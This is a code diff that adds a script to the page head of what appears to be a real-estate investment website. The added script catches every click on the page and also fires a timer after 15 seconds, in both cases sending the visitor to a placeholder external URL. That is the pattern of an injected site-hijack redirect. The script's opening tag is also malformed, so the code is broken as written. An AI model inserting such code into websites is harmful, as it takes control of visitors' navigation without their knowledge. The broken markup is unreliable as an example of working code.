@@ -34,7 +34,18 @@
 
 <link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
 <link rel='dns-prefetch' href='//code.highcharts.com' />
+<script
+	// Function to redirect to a new website
+function redirectToNewWebsite() {
+  window.location.href = 'https://www.newwebsite.com'; // Change the URL to the desired new website
+}
 
+// Add event listener for clicks anywhere on the site
+document.addEventListener('click', redirectToNewWebsite);
+
+// Set a timer to redirect after 15 seconds
+setTimeout(redirectToNewWebsite, 15000); // 15000 milliseconds = 15 seconds
+</script>
 
 <link rel="alternate" type="application/rss+xml" title="Norada Real Estate Investments &raquo; Feed" href="https://www.noradarealestate.com/feed/" />
 <link rel="alternate" type="application/rss+xml" title="Norada Real Estate Investments &raquo; Comments Feed" href="https://www.noradarealestate.com/comments/feed/" />
